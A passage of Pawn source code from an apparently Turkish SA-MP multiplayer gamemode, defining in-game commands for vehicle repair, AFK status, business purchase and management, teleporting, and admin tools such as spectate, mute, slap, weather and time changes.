    		//SendClientMessage(playerid, 0xFFFFFFFF, "");
   		}

	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:tamir(playerid, params[])
{
  return cmd_asistan(playerid, params);
}

CMD:stamir(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/stamir", params);
	if(APlayerData[playerid][PlayerScore] < 5000) return SendClientMessage(playerid,-1,"{FF0000}Etkinliklere katýlmak için en az 5.000 skor olmalýsýn");
	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
	    if(APlayerData[playerid][PlayerMoney] < 2000) return SendClientMessage(playerid, -1, "{FF0000}2000$'ýnýz yok!");
	    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	    {
	        new VModel = GetVehicleModel(GetPlayerVehicleID(playerid));
	        if(VModel == VehicleShamal || VModel == VehicleNevada || VModel == VehicleAT400 || VModel == VehicleAndromada || VModel == VehicleMaverick || VModel == VehicleDodo)
	        {
				// Fully repair the vehicle (damage value and bodywork)
				RepairVehicle(GetPlayerVehicleID(playerid));
				// Also re-fuel the vehicle
				AVehicleData[GetPlayerVehicleID(playerid)][Fuel] = 2400;
    			new engine,alarm,doors,bonnet,boot,objective;
       			SetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, 1, alarm, doors, bonnet, boot, objective);
       			carmsg[playerid] = 0;
				RewardPlayer(playerid, -500, 0);
				// Let the player know he spent $2000 for auto-repair because there were no assistance players online
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FFFFFF}Aracýnýz {FF0000} $500 {FFFFFF}'a tamir edildi.");
			    //SendClientMessage(playerid, 0xFFFFFFFF, "");
				return 1;
			}
	    }

		// Check if the player is the driver of a vehicle
		if (GetPlayerVehicleSeat(playerid) == 0)
		{
			// Fully repair the vehicle (damage value and bodywork)
			RepairVehicle(GetPlayerVehicleID(playerid));
			// Also re-fuel the vehicle
			AVehicleData[GetPlayerVehicleID(playerid)][Fuel] = 2000;
		    new engine,alarm,doors,bonnet,boot,objective;
	     	SetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, 1, alarm, doors, bonnet, boot, objective);
       		carmsg[playerid] = 0;
			RewardPlayer(playerid, -2000, 0);
			// Let the player know he spent $2000 for auto-repair because there were no assistance players online
		 	SendClientMessage(playerid, 0xFFFFFFFF, "{FFFFFF}Aracýnýz {FF0000} $2000 {FFFFFF}'a tamir edildi.");
    		//SendClientMessage(playerid, 0xFFFFFFFF, "");
   		}

	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

/*CMD:ok(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/ok", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if(OnayliOyuncu[playerid] == 1)
		{
		RepairVehicle(GetPlayerVehicleID(playerid));
		// Also re-fuel the vehicle
		AVehicleData[GetPlayerVehicleID(playerid)][Fuel] = MaxFuel;
 		new alarm,doors,bonnet,boot,objective;
		SetVehicleParamsEx(GetPlayerVehicleID(playerid), 1, 1, alarm, doors, bonnet, boot, objective);
		carmsg[playerid] = 0;
		RewardPlayer(playerid, -1500, 0);
		AddVehicleComponent(GetPlayerVehicleID(playerid), 1010); // Add nitro to the player's vehicle
		SendClientMessage(playerid,-1,"{FF0000}[BILGI]{00ff00} 'ONAYLI UYE' Oldugunuz Icýn 1500$ Karsýlýgýnda NOS(nitro 10x) + FULL Tamir aldýnýz");
	 	}
	 	else
	 	{
	 	SendClientMessage(playerid,-1,"Onayli Üye Degilsiniz ( 250 Skora Ulastiginizda Otomatik Onaylanirsiniz )");
	 	}
	}
	return 1;
}
*/
CMD:afk(playerid,params[])
{
	if(AfkDurum[playerid] == 0)
	{
		if (APlayerData[playerid][PlayerWanted] < 1)
		 {
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}AFK Oldunuz , Geri Geldiginizde  '{FFCC00}/geldim' {FFFFFF} yazarak oyuna devam edebilirsiniz"); //this will send the message to player informing to him he his afk
		    new oyad[255],string[255]; //the string for the message
		    GetPlayerName(playerid, oyad, sizeof(oyad)); //this will take the player name
		    format(string, sizeof(oyad), "{FFCC00}» {FFFFFF}Oyuncu {FFCC00} %s {FFFFFF} Klavye Baþýnda Deðil. {FF0000}[ AFK ]", oyad); // the message with the string
		    SendClientMessageToAll(-1, string); //the message
		    TogglePlayerControllable(playerid, 0);
		    AfkDurum[playerid] = 1;
	  	}
	  	else
	  	{
	  	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}ARANIYORKEN AFK OLAMAZSINIZ !!!! {FFCC00}/karakol /cezaode ");
 		}
    }
    else
    {
    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Zaten AFK Siniz Geri Dönmek Icin '{FFCC00}/geldim'  {FFFFFF} yazabilirsiniz ");
    }
	return 1;
}

// This command adds nitro to the player's vehicle
CMD:nos(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/nos", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
		{
			/*// Check if the player is the driver of a vehicle
			if (GetPlayerVehicleSeat(playerid) == 0)
			{
				// Check if the vehicle isn't owned (owned vehicle's need to buy nitro at mod garages)
				if (AVehicleData[GetPlayerVehicleID(playerid)][Owned] == false)
					AddVehicleComponent(GetPlayerVehicleID(playerid), 1010); // Add nitro to the player's vehicle
			}*/
			SendClientMessage(playerid,-1," {FFCC00}» {FFFFFF}Nos Kullanmak Ýcin Aracýnýza Modifiyecilerden NOS eklemelisiniz. Mouse ile otomatik Nos Kullanmak için {FFCC00}VIP {FFFFFF}olabilirsiniz ");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:geldim(playerid,params[])
{
	if(AfkDurum[playerid] == 1)
	{

    TogglePlayerControllable(playerid, 1);
    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Tekrardan Hosgeldiniz");
    new oyad[255],string[255];
    GetPlayerName(playerid, oyad, sizeof(oyad));
    format(string, sizeof(string), "{FFCC00}» {FFFFFF}Oyuncu {FFCC00} %s {FFFFFF} Tekrar Klavye Baþýnda", oyad);
    SendClientMessageToAll(-1, string);
    AfkDurum[playerid] = 0;
    AFKSure[playerid] = 0;
    }
    else
    {
    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}AFK Degilsiniz. ");
    }
    return 1;
}

// This command let's an admin spectate another player
CMD:spec(playerid, params[])
{
	// Setup local variables
	new OtherPlayer, Name[24], Msg[128], Float:x, Float:y, Float:z, Float:angle;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/spec", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "{FFCC00}» {FFFFFF}/spec {FFCC00}<ID>");
			else
			{
				// Check if that other player is online
				if (IsPlayerConnected(OtherPlayer))
				{
					// Get the player's name
					GetPlayerName(OtherPlayer, Name, sizeof(Name));
					// Get current coordinates
					GetPlayerPos(playerid, x, y, z);
					GetPlayerFacingAngle(playerid, angle);

					// Only save the current positon at the first time
					if (GetPlayerState(playerid) != PLAYER_STATE_SPECTATING)
					{
						APlayerData[playerid][SpectateX] = x;
						APlayerData[playerid][SpectateY] = y;
						APlayerData[playerid][SpectateZ] = z;
						APlayerData[playerid][SpectateA] = angle;
						APlayerData[playerid][Spectating] = true;
					}

				    // Turn spectating on
				    TogglePlayerSpectating(playerid, 1);
				    //new Float:xx,Float:yy,Float:zz,Float:aa;
				    //GetPlayerPos(playerid,xx,yy,zz);
				    //burayagel
		            //SetSpawnInfo(playerid, 0, GetPlayerSkin(playerid), xx, yy, zz, aa, 0, 0, 0, 0, 0, 0);

					// Check if the other player is driving a vehicle
					if (GetPlayerVehicleSeat(OtherPlayer) == -1)
					{
						// The other player is on foot, so spectate him
						PlayerSpectatePlayer(playerid, OtherPlayer);
						SetPlayerInterior(playerid, GetPlayerInterior(OtherPlayer));
						APlayerData[playerid][SpectateID] = OtherPlayer;
						APlayerData[playerid][SpectateType] = ADMIN_SPEC_TYPE_PLAYER;
					}
					else
					{
						// The other player is in a vehicle, so spectate the vehicle
						PlayerSpectateVehicle(playerid, GetPlayerVehicleID(OtherPlayer));
						APlayerData[playerid][SpectateID] = OtherPlayer;
						APlayerData[playerid][SpectateVehicle] = GetPlayerVehicleID(OtherPlayer);
						APlayerData[playerid][SpectateType] = ADMIN_SPEC_TYPE_VEHICLE;
					}

					format(Msg, 128, "{00FF00}Ýzlenen Oyuncu : {FFFF00}%s", Name);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Ýzlemekten çýkmak için {FFCC00}/specoff");
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}}Boyle Bir Oyuncu Aktif Degil.");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// This command ends the spectate mode
CMD:specoff(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/specoff", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
		{
			// Check if the player is spectating
			if (GetPlayerState(playerid) == PLAYER_STATE_SPECTATING)
			{
			    TogglePlayerSpectating(playerid, 0);
				APlayerData[playerid][SpectateID] = -1;
				APlayerData[playerid][SpectateVehicle] = -1;
				APlayerData[playerid][SpectateType] = ADMIN_SPEC_TYPE_NONE;
			}
			else
			    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Oyuncu Ýzlemeyi Bitirdiniz.");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}



// Lets the player add new businesses
CMD:isyeriolustur(playerid, params[])
{
	// Setup local variables
	new BusinessList[2000];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/isyeriolustur", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 7
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1 || Root2[playerid] == 1)
		{
			// Check if the player isn't inside a vehicle
			/*if (GetPlayerVehicleSeat(playerid) == -1)
			{*/
				// Construct the list of businesses
				for (new BusType = 1; BusType < sizeof(ABusinessInteriors); BusType++)
				{
				    format(BusinessList, sizeof(BusinessList), "%s%s\n", BusinessList, ABusinessInteriors[BusType][InteriorName]);
				}

				// Let the player choose a business-type via a dialog
				ShowPlayerDialog(playerid, DialogCreateBusSelType, DIALOG_STYLE_LIST, "Choose business-type:", BusinessList, "Select", "Cancel");
			/*}
			else
			    SendClientMessage(playerid, 0xFF0000FF, "You can't be inside a vehicle to create a business");*/
		}
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// This command lets the player delete a business
CMD:isyerisil(playerid, params[])
{
	// Setup local variables
	new /*file[100],*/ Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/isyerisil", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 7
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1 || Root2[playerid] == 1)
		{
			// Make sure the player isn't inside a vehicle
			if (GetPlayerVehicleID(playerid) == 0)
			{
				// Loop through all player-owned businesses
				for (new BusID = 1; BusID < MAX_BUSINESS; BusID++)
				{
					// Check if the business exists
					if (ABusinessData[BusID][PickupID] != 0)
					{
						// Check if the business has no owner
						if (ABusinessData[BusID][Owned] == false)
						{
							// Check if the player is in range of the business-pickup
							if (IsPlayerInRangeOfPoint(playerid, 2.5, ABusinessData[BusID][BusinessX], ABusinessData[BusID][BusinessY], ABusinessData[BusID][BusinessZ]))
							{
								// Clear all data of the business
	                            //ABusinessData[BusID][BusinessName] = 0;
	                            ABusinessData[BusID][BusinessX] = 0.0;
	                            ABusinessData[BusID][BusinessY] = 0.0;
	                            ABusinessData[BusID][BusinessZ] = 0.0;
	                            ABusinessData[BusID][BusinessType] = 0;
	                            //ABusinessData[BusID][BusinessLevel] = 0;
	                            //ABusinessData[BusID][LastTransaction] = 0;
	                            ABusinessData[BusID][Owned] = false;
	                            //ABusinessData[BusID][Owner] = 0;
								// Destroy the mapicon, 3DText and pickup for the house
								DestroyDynamicPickup(ABusinessData[BusID][PickupID]);
								DestroyDynamicMapIcon(ABusinessData[BusID][MapIconID]);
								DestroyDynamic3DTextLabel(ABusinessData[BusID][DoorText]);
	                            ABusinessData[BusID][PickupID] = 0;
	                            ABusinessData[BusID][MapIconID] = 0;

								// Delete the business-file
								/*format(file, sizeof(file), BusinessFile, BusID); // Construct the complete filename for this business-file
								if (fexist(file)) // Make sure the file exists
									fremove(file); // Delete the file*/

                                SQL::DeleteRow("isyerleri", "ID", BusID);

								// Also let the player know he deleted the business
								format(Msg, 128, "{00FF00}You have deleted the business with ID: {FFFF00}%i", BusID);
								SendClientMessage(playerid, 0xFFFFFFFF, Msg);

								// Exit the function
								return 1;
							}
						}
					}
				}

				// There was no house in range, so let the player know about it
				SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}No business in range to delete");
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You can't be inside a vehicle to delete a business");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// This command lets the player buy a business when he's standing in range of a business that isn't owned yet
CMD:buybus(playerid, params[])
{
	// Setup local variables
	new Msg[128], BusType;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/buybus", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Make sure the player isn't inside a vehicle
		if (GetPlayerVehicleID(playerid) == 0)
		{
		    if(Player_CountBusiness(playerid) == MAX_BUSINESSPERPLAYER) return SendClientMessage(playerid, 0xFF0000FF, "Ýþyeri alma sýnýrýný aþamazsýnýz!");
			// Check if the player is near a business-pickup
			for (new i = 1; i < MAX_BUSINESS; i++)
			{
				// Check if this business is created (it would have a valid pickup in front of the door)
				if (ABusinessData[i][PickupID] != 0)
				{
					// Check if the player is in range of the business-pickup
					if (IsPlayerInRangeOfPoint(playerid, 2.5, ABusinessData[i][BusinessX], ABusinessData[i][BusinessY], ABusinessData[i][BusinessZ]))
					{
					    // Check if the business isn't owned yet
					    if (ABusinessData[i][Owned] == false)
					    {
							// Get the type of business
							BusType = ABusinessData[i][BusinessType];
					        // Check if the player can afford this type of business business
					        if (APlayerData[playerid][PlayerMoney] >= ABusinessInteriors[BusType][BusPrice])
					            Business_SetOwner(playerid, i); // Give ownership of the business to the player
					        else
					            SendClientMessage(playerid, 0xFF0000FF, "Bu iþyerini almaya paranýz yok"); // The player cannot afford this business
					    }
					    else
					    {
					        // Let the player know that this business is already owned by a player
							format(Msg, 128, "{FF0000}Bu iþyerinin sahibi var ve kendisi {00FF00}%s {FF0000}oluyor", ABusinessData[i][Owner]);
							SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					    }

						// The player was in range of a business-pickup, so stop searching for the other business pickups
					    return 1;
					}
				}
				/*else
				    return 1;*/ // If there are no more houses (no more pickup-id's found), stop searching
			}

			// All businesses have been processed, but the player wasn't in range of any business-pickup, let him know about it
			SendClientMessage(playerid, 0xFF0000FF, "Ýþyeri satýn alabilmek için bir iþyerinin önünde olmalýsýnýz");
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "Araç içindeyken iþyeri satýn alamazsýnýz");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
		return 1;
}

// This command opens a menu when you're inside your business to allow to access the options of your business
CMD:isyerimenu(playerid, params[])
{
	// Setup local variables
	new OptionsList[200], DialogTitle[200];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/isyerimenu", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player is inside a business
		if (APlayerData[playerid][CurrentBusiness] != 0)
		{
            if(isyerimdeyim[playerid] == 1)
            {
           		new query[256], bName[100], Cache: get_isyeri, rows;
				mysql_format(Connection, query, sizeof(query), "SELECT Isim FROM isyerleri WHERE ID = '%d'", APlayerData[playerid][CurrentBusiness]);
				get_isyeri = mysql_query(Connection, query);
				rows = cache_num_rows();

				if(rows)
				{
					for(new i; i < rows; ++i)
	 				{
						cache_get_value_name(i, "Isim", bName);
  					}
				}

				cache_delete(get_isyeri);

				format(DialogTitle, sizeof(DialogTitle), "Ýþyeri %s", bName);
				format(OptionsList, sizeof(OptionsList), "%sÝþyeri Ýsmini Deðiþtir\n", OptionsList);
				format(OptionsList, sizeof(OptionsList), "%sÝþyerini Geliþtir\n", OptionsList);
				format(OptionsList, sizeof(OptionsList), "%sÝþyeri Kasasýndan Para Çek\n", OptionsList);
				format(OptionsList, sizeof(OptionsList), "%sÝþyerini Sat\n", OptionsList);
				format(OptionsList, sizeof(OptionsList), "%sÝsyerinden Cik\n", OptionsList);
				// Show the businessmenu
				ShowPlayerDialog(playerid, DialogBusinessMenu, DIALOG_STYLE_LIST, DialogTitle, OptionsList, "Seç", "Ýptal");
			}
			else if(isyerimdeyim[playerid] == 2)
			{
			new BID = APlayerData[playerid][CurrentBusiness];
			Business_Exit(playerid,BID);
			}
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "Ýþyeri Ýçinde Deðilsiniz");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// This command teleports you to your selected business
CMD:gobus(playerid, params[])
{
	// Setup local variables
	new BusinessList[1000], BusID;
    new query[256], bName[100], Cache: get_isyeri, rows;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/gobus", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
	    if(APlayerData[playerid][JobStarted] == true) return SendClientMessage(playerid, -1, "{FF0000}Görevdeyken bu komutu kullanamazsiniz!");
		// Check if the player is not jailed
		if (APlayerData[playerid][PlayerJailed] == 0)
		{
			// Check if the player has a wanted level of less than 3
			if (APlayerData[playerid][PlayerWanted] < 3)
			{
				// Check if the player is not inside a vehicle
				if (GetPlayerVehicleID(playerid) == 0)
				{
				    Player_LoadBusiness(playerid);
					// Ask to which business the player wants to port
					for (new i; i < MAX_BUSINESSPERPLAYER; i++)
					{
						// Get the business-id
					    BusID = APlayerData[playerid][Business][i];

						// Check if this businessindex is occupied
						if (BusID != 0)
						{
							mysql_format(Connection, query, sizeof(query), "SELECT Isim,Kasa FROM isyerleri WHERE ID = '%d'", BusID);
							get_isyeri = mysql_query(Connection, query);
							rows = cache_num_rows();
							new bbks;
							if(rows)
							{
								for(new a; a < rows; ++a)
						 		{
									cache_get_value_name(a, "Isim", bName);
									cache_get_value_name_int(a, "Kasa", bbks);
                                    format(BusinessList, 1000, "%s{00FF00}%s{FFFFFF} (kazanç: $%i)\n", BusinessList, bName, bbks);
						   		}
							}

							cache_delete(get_isyeri);
							/*
							Earnings = (BusinessTransactionTime - ABusinessData[BusID][LastTransaction]) * ABusinessInteriors[BusType][BusEarnings] * ABusinessData[BusID][BusinessLevel];
							format(BusinessList, 1000, "%s{00FF00}%s{FFFFFF} (kazanç: $%i)\n", BusinessList, ABusinessData[BusID][BusinessName], Earnings);
							*/
						}
						else
							format(BusinessList, 1000, "%s{FFFFFF}%s{FFFFFF}\n", BusinessList, "Boþ Ýþyeri Slotu");
					}
					ShowPlayerDialog(playerid, DialogGoBusiness, DIALOG_STYLE_LIST, "Gitmek Ýstediðiniz Ýþyerinizi Seçin:", BusinessList, "Seç", "Ýptal");
				}
				else
					SendClientMessage(playerid, 0xFF0000FF, "Ýþyerinize ýþýnlanabilmek için ayakta olmalýsýnýz");
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Aranýyorken iþyerinize ýþýnlanamazsýnýz");
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "Hapisteyken iþyerinize ýþýnlanamazsýnýz");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}


CMD:gohome(playerid, params[])
{


	// Setup local variables
	new HouseList[1000];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/gohome", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
	    if(APlayerData[playerid][JobStarted] == true) return SendClientMessage(playerid, -1, "{FF0000}Görevdeyken bu komutu kullanamazsiniz!");
		// Check if the player has a wanted level of less than 3
		if (APlayerData[playerid][PlayerWanted] < 3)
		{
			// Check if the player is not jailed
			if (APlayerData[playerid][PlayerJailed] == 0)
			{
				// Check if the player is not inside a vehicle
				if (GetPlayerVehicleID(playerid) == 0)
				{
				    Player_LoadHouses(playerid);
					new HousID;
					// Ask to which house the player wants to add his vehicle
					for (new i; i < LIMIT_PER_PLAYER; i++)
					{
						HousID = Evlerii[playerid][i];
						// Check if this houseindex is occupied
						if (HousID != 0)
						{
							format(HouseList, 1000, "%s{00FF00}%s{FFFFFF}\n", HouseList, HouseData[HousID][HOName]);
						}else{
							format(HouseList, 1000, "%s{FFFFFF}%s{FFFFFF}\n", HouseList, "Boþ Ev Slotu");
						}
					}
					ShowPlayerDialog(playerid, DialogGoHome, DIALOG_STYLE_LIST, "Gitmek Ýstediðiniz Evi Seçin:", HouseList, "Seç", "Ýptal");
				}
				else
					SendClientMessage(playerid, 0xFF0000FF, "Eve gidebilmek için ayakta olmalýsýnýz");
			}
			else
			    SendClientMessage(playerid, 0xFF0000FF, "Hapisteyken eve gidemezsiniz");
		}
		else
			SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Aranýyorken eve ýþýnlanamazsýnýz");
	}
	else
	    return 0;

	// Let the server know that this was a valid command

	return 1;
}





CMD:osaat(playerid, params[])
{
	// Setup local variables
	new time, PortMsg[255];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/osaat", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 5 || Root[playerid] == 1)
		{
		    if(sscanf(params, "i", time)) return SendSyntaxMessage(playerid, "/osaat <saat>");
		    if(time > 24 || time < 0) return SendClientMessage(playerid, -1, "Error: Invalid time!");
		    SetWorldTime(time);
		    for(new i =0;i < MAX_PLAYERS;i++)
		    {
			PlayerPlaySound(i,1057,0.0,0.0,0.0);
		    }
		    new Name[MAX_PLAYER_NAME];
			GetPlayerName(playerid, Name, sizeof(Name));
		    format(PortMsg, 128, "{ffffff} ADMIN %s oyun saatini %i:00 olarak deðiþtirdi.", Name, time);
			SendClientMessageToAll(0xFFFFFFFF, PortMsg);
		}

	}
	return 1;
}


CMD:ohava(playerid, params[])
{
	// Setup local variables
	new Hava, PortMsg[255];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/ohava", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 5 || Root[playerid] == 1)
		{
		    if(sscanf(params, "i", Hava)) return SendSyntaxMessage(playerid, "/ohava <hava>");

			SetWeather(Hava);
			new Name[MAX_PLAYER_NAME];
			GetPlayerName(playerid, Name, sizeof(Name));
			format(PortMsg, 128, "{ffffff} ADMIN %s  Tarafýndan Oyun Havasý Degistirildi.",Name);
			SendClientMessageToAll(0xFFFFFFFF, PortMsg);
		}

	}
	return 1;
}

/*
CMD:ohava(playerid, params[])
{
	// Setup local variables
	new Hava, PortMsg[255];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/osaat", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 4 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", Hava)) SendClientMessage(playerid, 0xFF0000AA, "Usage: \"/osaat <0-1>\"");
			else
			{
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
							if(IsPlayerConnected(i))
							{
								PlayerPlaySound(i,1057,0.0,0.0,0.0);
								SetPlayerWeather(i, Hava);
							}
					}
					format(PortMsg, 128, "{ffffff} ADMIN %s Tarafýndan Oyun Havasý Degistirildi.",playerid);
					SendClientMessageToAll(0xFFFFFFFF, PortMsg);
			}
		}
	}
	// Let the server know that this was a valid command
	return 1;
}
*/


CMD:odul(playerid, params[])
{
	// Setup local variables
	new OtherPlayer, PortMsg[255];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/odul", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "/odul <ID>");
			else
			{
				// Check if that other player is online
				if (IsPlayerConnected(OtherPlayer))
				{
					new Name[MAX_PLAYER_NAME];
					GetPlayerName(OtherPlayer, Name, sizeof(Name));
					RewardPlayer(OtherPlayer,50000,5);
					format(PortMsg, 128, "{FF0000}ADMIN %s, %s{DDDDDD}'i ödüllendirdi. {00FFFF}$50.000 ve 5 Skor", GetName(playerid), GetName(OtherPlayer));
					SendClientMessageToAll(-1,PortMsg);

				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}




CMD:getall(playerid, params[])
{
	// Setup local variables
	new PortMsg[255],Float:xx,Float:yy,Float:zz;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/getall", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 4 || Root[playerid] == 1)
		{
		        GetPlayerPos(playerid,xx,yy,zz);
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
							if(IsPlayerConnected(i))
							{
								PlayerPlaySound(i,1057,0.0,0.0,0.0);
								SetPlayerPos(i,xx+2,yy,zz+2);
							}
					}
					format(PortMsg, 128, "{ff0000} ADMIN %s , Tum Oyuncularý Yanýna Cekti.", GetName(playerid));
					SendClientMessageToAll(0xFFFFFFFF, PortMsg);
  		}
	}
	return 1;
}



CMD:slap(playerid, params[])
{
	// Setup local variables
	new OtherPlayer, PortMsg[255];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/slap", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "/slap <ID>");
			else
			{
				// Check if that other player is online
				if (IsPlayerConnected(OtherPlayer))
				{
					new Name[MAX_PLAYER_NAME];
					GetPlayerName(OtherPlayer, Name, sizeof(Name));
					new Float:xx,Float:yy,Float:zz;
					GetPlayerPos(OtherPlayer,xx,yy,zz);
					SetPlayerPos(OtherPlayer,xx,yy,zz+10);
					PlayerPlaySound(OtherPlayer,1190,0.0,0.0,0.0);
					PlayerPlaySound(playerid,1190,0.0,0.0,0.0);
					format(PortMsg, 128, "{ffffff} %s Adlý oyuncuyu tokatladýnýz", Name);
					SendClientMessage(playerid, 0xFFFFFFFF, PortMsg);

				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}



// Mutes a player (he cannot talk anymore)
CMD:mute(playerid, params[])
{
	// Setup local variables
	new Msg[128], Name[24], AdminName[24], Reason[128], OtherPlayer, Sure;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/mute", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
		{
			if (sscanf(params, "uis[128]", OtherPlayer, Sure, Reason)) SendSyntaxMessage(playerid, "/mute <ID> <Süre> <Sebep>");
			else
			{
				// Check if the otherplayer is online
				if (IsPlayerConnected(OtherPlayer))
				{
					// Get the player-names
					GetPlayerName(playerid, AdminName, sizeof(AdminName));
					GetPlayerName(OtherPlayer, Name, sizeof(Name));
					// Mute the other player
					APlayerData[OtherPlayer][Muted] = Sure;
					// Let the other player know that he has been muted
					format(Msg, 128, "{FF0000}Admin {FFFF00}%s tarafýndan %d saniye susturuldunuz {FF0000} Sebep : {FFFF00}%s", AdminName, Sure, Reason);
					SendClientMessage(OtherPlayer, 0xFFFFFFFF, Msg);
					// Let the admin know who he has muted
					format(Msg, 128, "{00FF00} %s {FFFF00}%d saniye susturuldu", Name, Sure);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
					// Save the player-stats
					Oyuncu_Kaydet(OtherPlayer);

					new Yazi[256];
					format(Yazi, 256, "{FF0000}ADMIN %s, %s{F8F8FF}'yi {FF0000}%d saniye {F8F8FF}susturdu. {FF0000}[ %s ]", GetName(playerid), Name, Sure, Reason);
					SendClientMessageToAll(-1, Yazi);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}That player isn't online");
			}
		}
		else
		    return 0;
	}
	else
